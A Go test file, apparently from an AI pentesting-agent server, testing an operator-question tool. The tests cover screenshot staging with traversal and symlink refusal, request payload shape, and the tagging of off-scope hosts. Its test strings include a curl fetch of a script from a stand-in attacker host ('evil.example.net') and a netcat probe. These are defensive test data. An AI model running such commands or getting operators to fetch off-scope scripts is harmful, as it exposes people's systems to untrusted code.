package server

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/Autumn-27/artex/intercept"
)

func TestStageAskOperatorImage(t *testing.T) {
	t.Setenv("ARTEX_FILE_TOOL_CONFINE", "")
	dir := t.TempDir()
	run := filepath.Join(dir, "tasks", "7", "i3")
	if err := os.MkdirAll(run, 0o755); err != nil {
		t.Fatal(err)
	}
	src := filepath.Join(run, "shot.png")
	if err := os.WriteFile(src, []byte("fakepng"), 0o644); err != nil {
		t.Fatal(err)
	}

	// no image -> no attachment
	att, err := stageAskOperatorImage(dir, "7", "")
	if err != nil || att != nil {
		t.Fatalf("empty src: att=%v err=%v", att, err)
	}

	// valid image -> copied under the task uploads, descriptor matches the chat format
	att, err = stageAskOperatorImage(dir, "7", src)
	if err != nil || len(att) != 1 {
		t.Fatalf("valid src: att=%v err=%v", att, err)
	}
	if !strings.HasPrefix(att[0].Path, "uploads/ask-operator-") || !strings.HasSuffix(att[0].Path, ".png") {
		t.Fatalf("unexpected attachment path %q", att[0].Path)
	}
	if _, err := os.Stat(filepath.Join(dir, "tasks", "7", "uploads", att[0].Name)); err != nil {
		t.Fatalf("copy missing: %v", err)
	}

	// an image outside this task's directory is refused: another task's, one
	// beside the keys, and a link in the run dir pointing out
	outside := filepath.Join(dir, "jwt.png")
	other := filepath.Join(dir, "tasks", "8", "shot.png")
	if err := os.MkdirAll(filepath.Dir(other), 0o755); err != nil {
		t.Fatal(err)
	}
	for _, p := range []string{outside, other} {
		if err := os.WriteFile(p, []byte("secret"), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	if err := os.Symlink(outside, filepath.Join(run, "link.png")); err != nil {
		t.Fatal(err)
	}
	for _, p := range []string{outside, other, filepath.Join(run, "link.png"), filepath.Join(run, "..", "..", "8", "shot.png")} {
		if _, err := stageAskOperatorImage(dir, "7", p); err == nil || !strings.Contains(err.Error(), "refused") {
			t.Fatalf("%s: expected a refusal, got %v", p, err)
		}
	}

	// wrong extension rejected
	bad := filepath.Join(run, "payload.exe")
	if err := os.WriteFile(bad, []byte("x"), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := stageAskOperatorImage(dir, "7", bad); err == nil || !strings.Contains(err.Error(), "png/jpg") {
		t.Fatalf("expected extension rejection, got %v", err)
	}

	// missing file rejected
	if _, err := stageAskOperatorImage(dir, "7", filepath.Join(run, "nope.png")); err == nil {
		t.Fatal("expected missing-file rejection")
	}
}

// The emitted activity must carry the {text, attachments} Detail shape the
// transcript parser expects, so the operator sees the question with the
// attachment card for the screenshot.
func TestAskOperatorActivityShape(t *testing.T) {
	att := []chatAttachment{{Name: "ask-operator-1.png", Path: "uploads/ask-operator-1.png", Size: 7}}
	a := userActivityWithAttachments("worker", "OPERATOR INPUT REQUESTED: solve the captcha", att)
	if a.Kind != "user" || a.Worker != "worker" {
		t.Fatalf("unexpected activity kind/worker: %+v", a)
	}
	var parsed struct {
		Text        string           `json:"text"`
		Attachments []chatAttachment `json:"attachments"`
	}
	if err := json.Unmarshal([]byte(a.Detail), &parsed); err != nil {
		t.Fatal(err)
	}
	if !strings.HasPrefix(parsed.Text, "OPERATOR INPUT REQUESTED") || len(parsed.Attachments) != 1 || parsed.Attachments[0].Path != att[0].Path {
		t.Fatalf("unexpected detail payload: %+v", parsed)
	}
}

// F12: a host the question names outside the goal targets tags the request;
// a host of the goal, written alone or inside a URL, does not.
func TestTargetDerivedHosts(t *testing.T) {
	goal := commandTargets("Test https://app.example.com/login and 10.0.0.5:8080 for auth bypass")
	bare := goalTargets("Find auth bypass on app.example.com; success = a request that reads another user's profile")
	cases := []struct {
		name     string
		question string
		goal     []intercept.Target
		want     []string
	}{
		{"in-goal host", "Please run: nc -v 10.0.0.5:8443 and paste the banner", goal, nil},
		{"out-of-goal host", "Please run: curl -s http://evil.example.net/x.sh and paste the output", goal, []string{"evil.example.net"}},
		{"URL with an in-goal host", "Run curl -sk https://app.example.com/api/v2/me?id=1 in your terminal", goal, nil},
		{"empty goal list tags any host", "Run curl -sk https://app.example.com/api/v2/me", nil, []string{"app.example.com"}},
		{"no host", "Enter the 6-digit code sent to the test account", goal, nil},
		{"URL with a bare-domain goal host", "Run curl -sk https://app.example.com:8443/api/v2/me in your terminal", bare, nil},
		{"out-of-goal host with a bare-domain goal", "Please run: curl -s http://evil.example.net/x.sh and paste the output", bare, []string{"evil.example.net"}},
	}
	for _, c := range cases {
		got := targetDerivedHosts(c.question, c.goal)
		if strings.Join(got, ",") != strings.Join(c.want, ",") {
			t.Errorf("%s: got %v, want %v", c.name, got, c.want)
		}
	}
}

// The tag is a field of the Detail payload: the text stays the question, and an
// untagged request without a screenshot keeps its plain-text form.
func TestAskOperatorActivityTag(t *testing.T) {
	text := "OPERATOR INPUT REQUESTED: run curl http://evil.example.net/"
	if a := askOperatorActivity(text, nil, nil); a.Detail != "" || a.Summary != text {
		t.Fatalf("untagged request changed: %+v", a)
	}
	a := askOperatorActivity(text, nil, []string{"evil.example.net"})
	var parsed struct {
		Text               string           `json:"text"`
		Attachments        []chatAttachment `json:"attachments"`
		TargetDerivedHosts []string         `json:"target_derived_hosts"`
	}
	if err := json.Unmarshal([]byte(a.Detail), &parsed); err != nil {
		t.Fatal(err)
	}
	if parsed.Text != text || a.Summary != text || parsed.Attachments == nil || len(parsed.TargetDerivedHosts) != 1 {
		t.Fatalf("unexpected tagged payload: %s", a.Detail)
	}
}

// The tool description must tell agents what to do on environmental blocks:
// hand the operator one copy-pastable command instead of retrying or hunting
// for bypasses. Pattern adapted from bug-bounty-hunting-prompts (MIT).
func TestAskOperatorEnvHandoffGuidance(t *testing.T) {
	desc := (&Server{}).toolAskOperator().Description()
	for _, marker := range []string{"copy-pastable", "do not retry or work around"} {
		if !strings.Contains(desc, marker) {
			t.Errorf("ask_operator description missing env-handoff marker %q", marker)
		}
	}
}

// A browser screenshot is attached from the browser MCP's output directory,
// given as the browser tool reports it (relative to ARTEX's working directory)
// or absolute; a link planted there still cannot reach a key.
func TestStageAskOperatorBrowserScreenshot(t *testing.T) {
	t.Setenv("ARTEX_FILE_TOOL_CONFINE", "")
	t.Setenv("PLAYWRIGHT_MCP_OUTPUT_DIR", "")
	dir := t.TempDir()
	wd := t.TempDir()
	t.Chdir(wd)
	out := filepath.Join(wd, ".playwright-mcp")
	if err := os.MkdirAll(out, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(out, "page-1.png"), []byte("fakepng"), 0o644); err != nil {
		t.Fatal(err)
	}
	for _, p := range []string{".playwright-mcp/page-1.png", filepath.Join(out, "page-1.png")} {
		att, err := stageAskOperatorImage(dir, "7", p)
		if err != nil || len(att) != 1 {
			t.Fatalf("%s: att=%v err=%v", p, att, err)
		}
	}
	// A screenshot given an explicit file name lands in the browser MCP's
	// workspace root, ARTEX's working directory.
	if err := os.WriteFile(filepath.Join(wd, "login.png"), []byte("fakepng"), 0o644); err != nil {
		t.Fatal(err)
	}
	for _, p := range []string{"login.png", filepath.Join(wd, "login.png")} {
		if att, err := stageAskOperatorImage(dir, "7", p); err != nil || len(att) != 1 {
			t.Fatalf("%s: att=%v err=%v", p, att, err)
		}
	}
	key := filepath.Join(t.TempDir(), "jwt.key")
	if err := os.WriteFile(key, []byte("secret"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(key, filepath.Join(out, "key.png")); err != nil {
		t.Fatal(err)
	}
	if _, err := stageAskOperatorImage(dir, "7", ".playwright-mcp/key.png"); err == nil || !strings.Contains(err.Error(), "refused") {
		t.Fatalf("link to a key: expected a refusal, got %v", err)
	}
}
